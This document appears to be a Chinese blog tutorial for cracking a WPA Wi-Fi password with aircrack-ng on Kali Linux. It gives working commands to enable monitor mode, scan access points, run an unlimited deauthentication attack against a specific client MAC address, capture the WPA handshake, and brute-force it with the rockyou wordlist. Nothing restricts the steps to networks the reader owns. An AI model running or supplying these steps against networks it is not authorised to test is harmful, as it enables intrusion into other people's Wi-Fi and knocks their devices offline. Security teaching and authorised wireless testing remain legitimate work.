
`iwconfig`


## 查看无线网卡

`airmon-ng`
上面命令列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。

## 开启网卡监听模式,记录Interface名称

`airmon-ng  start wlan0`
如果有下图提示表示有其他网卡处于监控模式。

## 扫描信号

`airodump-ng wlan0mon`

 *   BSSID是AP端的MAC地址
 *  PWR是信号强度，数字越小越好
 *  Data是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大。
 *   CH是对应路由器的所在信道
 *   ESSID是对应路由器的名称

找到目标后，`ctrl + c` 中止

## 抓取握手包

```
airodump-ng -c 11 -w ./test --bssid 78:44:FD:83:0B:2C wlan0mon
airodump-ng -c <AP的信道> -w <抓取握手包的存放位置名称> --bssid <AP的MAC地址> <你的的Interface名称>
```

## 解除认证
保持上一个terminal窗口的运行状态，打开一个新的terminal,进行解除认证攻击
强制连接到wifi的设备重新连接路由器，掉线设备重连后，如图所示位置显示`WPA handshake --`即成功抓取到握手包。
两个terminal使用`ctrl+c`终止攻击和握手抓包。

```
aireplay-ng -0 0 -a 9C:A6:15:D0:04:C9 -c D8:32:E3:A7:B9:6F wlan0mon
aireplay-ng -<攻击模式，我们这里使用 解除认证攻击(数字0)> [攻击次数，0为无限攻击] -a <AP端的MAC地址> -c <客户端端的MAC地址> <interface名称>
```

## 关闭无线网卡的监听模式
`airmon-ng stop wlan0mon`

## 使用字典
kali下自带一份无线密码字典 -->`/usr/share/wordlists/rockyou.txt.gz`
解压：
`gzip -d /usr/share/wordlists/rockyou.txt.gz`

```
aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap
#-w指定 密码字典 -b指定路由器的MAC地址
```

爆破成功后，如图区域位置显示`KEY FOUND!`字样，中括里为AP端的密码。

# 参考文章
[使用Aircrack-ng 工具进行WIFI的监听和破解 - 林中静月下仙的博客](https://blog.csdn.net/qq_21137441/article/details/88795079)
